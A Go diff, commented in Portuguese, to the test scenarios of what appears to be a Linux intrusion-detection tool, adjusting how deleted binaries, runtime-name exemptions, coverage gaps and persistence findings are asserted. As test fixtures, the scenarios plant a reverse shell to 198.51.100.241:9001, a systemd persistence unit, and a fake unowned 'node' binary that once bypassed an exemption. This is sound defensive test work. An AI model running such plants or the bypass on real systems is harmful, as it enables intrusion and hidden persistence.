@@ -166,15 +166,61 @@ func init() {
 		Images: matriz,
 		// Mesma razão do cenário acima: copiar o /bin/sleep do Alpine copia o
 		// busybox inteiro, e invocá-lo como ".y" não resolve applet nenhum.
+		// O PLANTIO MUDOU DE DIRETÓRIO, e é o conserto de uma contradição antiga
+		// entre o que este cenário afirmava e o que ele montava.
+		//
+		// O comentário abaixo sempre disse que o WARN existe porque "isto
+		// acontece em TODA atualização de pacote com o serviço no ar" — e o
+		// plantio apagava um binário de /tmp, que é a forma OPOSTA: não existe
+		// atualização de pacote que entregue binário ali. A ferramenta lia a
+		// diferença certo (o proc.deleted_mapping sobe para CRITICAL em
+		// diretório gravável) e o cenário cobrava exit 1, então ele falhava
+		// dizendo que o produto errou. O produto não errou; o plantio é que não
+		// representava a frase.
+		//
+		// Agora ele representa: /usr/local/lib é caminho de biblioteca de
+		// sistema, e apagar dali com o processo no ar é exatamente o que um
+		// upgrade faz. A forma adversarial ganhou cenário próprio, o 11b.
+		Plant: `mkdir -p /usr/local/lib
+			cp /helper /usr/local/lib/.y
+			/usr/local/lib/.y sleep 300 &
+			sleep 0.4
+			rm -f /usr/local/lib/.y`,
+		// WARN, não CRITICAL: é o que acontece em TODA atualização de pacote
+		// com o serviço no ar. A severidade precisa refletir isso.
+		Expect: []Expect{
+			{ID: "proc.exe_deleted", Sev: "WARN"},
+			{ID: "proc.deleted_mapping", Sev: "WARN"},
+		},
+		Forbid:         []string{"proc.memfd_exec"},
+		Exit:           1,
+		MustBeComplete: true,
+	})
+
+	Register(Scenario{
+		ID:     "11b-exe-apagado-de-diretorio-gravavel",
+		Desc:   "o mesmo apagamento, mas o binário rodava de /tmp: aí a explicação de rotina acaba",
+		Images: matriz,
+		// O contrapeso do 11, e a metade que estava sem cenário.
+		//
+		// A diferença entre os dois é UMA propriedade — de onde o binário
+		// rodava —, e ela é o que separa manutenção de incidente. Um upgrade
+		// deixa a biblioteca apagada em /usr/lib; ninguém entrega pacote em
+		// /tmp. Sem este par, a suíte não distinguiria uma ferramenta que
+		// classifica das que só reportam.
 		Plant: `cp /helper /tmp/.y
 			/tmp/.y sleep 300 &
 			sleep 0.4
 			rm -f /tmp/.y`,
-		// WARN, não CRITICAL: é o que acontece em TODA atualização de pacote
-		// com o serviço no ar. A severidade precisa refletir isso.
-		Expect:         []Expect{{ID: "proc.exe_deleted", Sev: "WARN"}},
+		Expect: []Expect{
+			// A mesma observação de antes continua saindo, e continua WARN.
+			{ID: "proc.exe_deleted", Sev: "WARN"},
+			// E a que lê o DIRETÓRIO sobe, porque a história de rotina não
+			// alcança /tmp.
+			{ID: "proc.deleted_mapping", Sev: "CRITICAL", Evidence: "gravável"},
+		},
 		Forbid:         []string{"proc.memfd_exec"},
-		Exit:           1,
+		Exit:           2,
 		MustBeComplete: true,
 	})
 
@@ -280,16 +326,49 @@ func init() {
 		// rodando de /tmp, que NÃO é isentado — está no teste unitário, porque
 		// depende só da regra e não do /proc.
 		Images: minimal,
+		// O DONO DE PACOTE não é enfeite do plantio: é metade da regra.
+		//
+		// A isenção exigia só nome de runtime + diretório de sistema, e a matriz
+		// adversarial mostrou o bypass — plantar um binário chamado `node` em
+		// /usr/bin comprava o silêncio. O 900c5eb fechou isso exigindo que algum
+		// pacote reivindique o arquivo, e este cenário passou a plantar um
+		// runtime INSTALADO, que é o que ele sempre quis representar. O bypass
+		// virou cenário próprio, o 18b.
 		Plant: `cp /helper /usr/bin/node
+			` + registraDonoDePacote("/usr/bin/node", "nodejs") + `
 			/usr/bin/node rwx &
 			sleep 0.4`,
 		Forbid: []string{"proc.maps_rwx_anon", "proc.suspicious_path"},
-		// E o que o catálogo de JIT isenta, a INTEGRIDADE pega: um "node" em
-		// /usr/bin que nenhum pacote reivindica é exatamente a forma de quem
-		// plantou um binário com nome de runtime num diretório de sistema.
-		// Os dois checks se completam em vez de se anular.
-		Expect: []Expect{{ID: "integrity.no_package_owner", Sev: "CRITICAL",
-			Subject: "/usr/bin/node"}},
+		// E o silêncio vem ACOMPANHADO: isenção é decisão de não olhar, e decisão
+		// de não olhar que não aparece na cobertura é a mentira que esta
+		// ferramenta existe para não cometer.
+		ExpectGap:        []string{"runtime com JIT em diretório de sistema"},
+		MustBeIncomplete: true,
+		Exit:             1,
+		// Orçamento de ruído MEDIDO: runtime instalado não produz achado nenhum.
+		MaxWarn: SemAvisos,
+	})
+
+	Register(Scenario{
+		ID:   "18b-nome-de-runtime-sem-pacote-nao-compra-isencao",
+		Desc: "o MESMO nome de runtime, no MESMO diretório de sistema, sem dono de pacote: a isenção não vale",
+		// O contrapeso do 18, e ele existe porque o bypass foi ENCONTRADO, não
+		// imaginado: a matriz adversarial plantou um binário chamado `node` em
+		// diretório de sistema e comprou com isso o silêncio do §3.10.
+		//
+		// A regra passou a exigir as três coisas juntas — nome de runtime,
+		// diretório de sistema e dono de pacote. Aqui só faltam a terceira, e o
+		// achado tem que sair. É a diferença entre "isento porque é o runtime da
+		// distribuição" e "isento porque escolheu o nome certo".
+		Images: minimal,
+		Plant: `cp /helper /usr/bin/node
+			/usr/bin/node rwx &
+			sleep 0.4`,
+		Expect: []Expect{
+			{ID: "proc.maps_rwx_anon", Sev: "WARN"},
+			// E a propriedade continua dizendo o resto da história.
+			{ID: "integrity.no_package_owner", Sev: "CRITICAL", Subject: "/usr/bin/node"},
+		},
 		Exit: 2,
 	})
 
@@ -331,9 +410,11 @@ func init() {
 		// pacote não é consultável nativamente, e 63 binários em execução ficam
 		// sem resposta. Reportar isso como "nenhum sem dono" seria a mentira
 		// exata que a ferramenta existe para não contar.
-		Images:           []string{"centos:7"},
-		Forbid:           []string{"integrity.no_package_owner"},
-		ExpectOutput:     []string{"não pôde ser consultada"},
+		Images: []string{"centos:7"},
+		Forbid: []string{"integrity.no_package_owner"},
+		// A lacuna é cobrada onde ela VIVE — na cobertura —, e não no texto do
+		// relatório, que só imprime o motivo com --coverage ou -v.
+		ExpectGap:        []string{"não pôde ser consultada"},
 		MustBeIncomplete: true,
 		Exit:             1,
 		// Orçamento de ruído MEDIDO: silêncio é o contrato deste cenário.
@@ -585,9 +666,22 @@ func init() {
 			sleep 0.4
 			/helper revshell 198.51.100.241:9001 &
 			sleep 0.5`,
-		Expect:         []Expect{{ID: "correlate.revshell", Sev: "CRITICAL"}},
-		Exit:           2,
-		MustBeComplete: true,
+		Expect: []Expect{{ID: "correlate.revshell", Sev: "CRITICAL"}},
+		Exit:   2,
+		// COBERTURA COMPLETA NÃO É CONTRATO DO `wtf`, e cobrá-la aqui era cobrar
+		// o oposto do que a SPEC 6.1 promete.
+		//
+		// O `wtf` tem teto rígido de 2s para o host inteiro; o que não couber
+		// "vira NÃO VERIFICADO e sai no rodapé". A sondagem de PID por sinal
+		// custa ~0,4s sozinha e por isso não roda ali — a decisão está em
+		// facts/crossview.go, e ela existe porque a alternativa medida era pior:
+		// deixá-la consumir o orçamento derrubava SEIS coletores que não têm
+		// nada a ver com PID, e limitá-la ao prazo restante zerava a varredura
+		// inteira (0/89).
+		//
+		// O que este cenário tem o direito de cobrar é o que o wtf promete: mesmo
+		// JSONL, mesmo exit code, e a lacuna DITA em vez de escondida.
+		ExpectGap: []string{"este comando tem teto de tempo"},
 	})
 
 	// ------------------------------------------------------- persistência (§7)
@@ -749,7 +843,14 @@ func init() {
 			{ID: "persist.ca_planted", Evidence: "PRESENÇA"},
 			// hook de git sobrevive ao redeploy e não mora em /etc
 			{ID: "persist.trigger_exec", Sev: "CRITICAL", Evidence: "sobrevive ao redeploy"},
-			{ID: "persist.web_prepend", Evidence: "§16"},
+			// A SUBSTÂNCIA, não o número da seção. O "§16" que estava aqui era um
+			// ponteiro de runbook embutido na prosa da evidência, e a
+			// reformulação do relatório o tirou de todos os checks — a referência
+			// virou campo estruturado (`ref`), que é onde ela pertence. Cobrar o
+			// ponteiro era amarrar o contrato à formatação; o que o cenário quer
+			// provar é que o achado explica POR QUE um webshell sem arquivo no
+			// docroot é pior de achar.
+			{ID: "persist.web_prepend", Evidence: "o docroot fica limpo"},
 		},
 		Exit: 2,
 	})
@@ -961,7 +1062,12 @@ func init() {
 			printf '[Timer]\nOnUnitActiveSec=1h\n' > /etc/systemd/system/systemd-netlinkd.timer
 			sleep 0.5`,
 		Expect: []Expect{
-			{ID: "persist.unit_dropin_exec", Sev: "WARN"},
+			// O Subject aqui é o que o ExpectOutput cobrava com "(sshd.service)":
+			// que o sujeito PRÓPRIO do achado sobreviva ao agrupamento por ator.
+			// Ele sobrevive — o relatório detalhado só deixou de pôr parênteses
+			// nele. A propriedade é do dado, e é aqui que ela para de depender
+			// de como o texto decide se apresentar.
+			{ID: "persist.unit_dropin_exec", Sev: "WARN", Subject: "sshd.service"},
 			// Os dois que fecharam a lacuna prevista.
 			{ID: "integrity.no_package_owner", Subject: "/usr/local/sbin/systemd-netlinkd"},
 			{ID: "net.egress_unowned", Evidence: "nenhuma lista de reputação"},
@@ -983,7 +1089,7 @@ func init() {
 		ExpectOutput: []string{
 			"/usr/local/sbin/systemd-netlinkd",
 			"no_package_owner + egress_unowned + unit_dropin_exec",
-			"(pid=", "(sshd.service)", // o sujeito próprio sobreviveu ao grupo (-v)
+			"(pid=",
 		},
 		Exit:           1,
 		MustBeComplete: true,
@@ -1084,11 +1190,16 @@ func init() {
 		Expect: []Expect{
 			{ID: "persist.file_watch", Sev: "CRITICAL", Evidence: "/etc/cron.d"},
 			{ID: "persist.file_watch", Evidence: "nenhum pacote reivindica"},
+			// O MECANISMO do "removi e voltou", que é a frase que este check
+			// existe para explicar. Estava sendo cobrado do relatório mesmo com
+			// -v, e ali não aparecia: é a terceira linha de evidência, e o -v
+			// corta em maxEvidencia. No JSONL está inteira.
+			{ID: "persist.file_watch", Evidence: "recriá-lo antes de a próxima linha"},
 		},
 		// O passo que evita o "voltou" é NextStep, e NextStep só sai no
 		// relatório detalhado — a asserção precisa do -v para alcançá-lo.
 		Args:         []string{"-v"},
-		ExpectOutput: []string{"ANTES de apagar", "recriá-lo antes de a próxima linha"},
+		ExpectOutput: []string{"ANTES de apagar"},
 		Exit:         2,
 	})
 
@@ -1359,7 +1470,6 @@ func init() {
 		},
 		// E a resposta precisa continuar completa: userland adulterado não
 		// degrada a cobertura, porque a CLI nunca dependeu dele.
-		ExpectOutput:   []string{"não confere com o que o pacote"},
 		Exit:           2,
 		MustBeComplete: true,
 	})
